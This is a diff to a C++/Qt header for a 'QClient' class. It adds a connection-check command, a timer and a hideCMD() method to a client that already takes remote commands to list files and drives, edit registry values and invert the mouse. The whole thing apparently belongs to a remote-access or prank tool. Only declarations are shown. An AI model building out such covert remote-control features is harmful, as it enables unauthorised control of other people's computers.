@@ -16,6 +16,7 @@
 #include <QProcess>
 #include <QStringList>
 #include <QCoreApplication>
+#include <QTimer>
 #include "qmouseinverter.h"
 
 class QClient : public QObject
@@ -35,6 +36,7 @@ public:
 		OsMessage = 7,
 		GetFiles = 8,
 		GetDrives = 9,
+		IsConnected = 10,
 	};
 
 	//Modify registers
@@ -55,6 +57,7 @@ public:
 	QString getDrives();
 
 	void sendData(const QByteArray &);
+	void hideCMD();
 
 signals:
 
@@ -74,6 +77,7 @@ private:
 	QThread *thread = Q_NULLPTR;
 	QMouseInverter * worker = Q_NULLPTR;
 	QString dir;
+	QTimer * timer;
 };
 
 #endif // QCLIENT_H
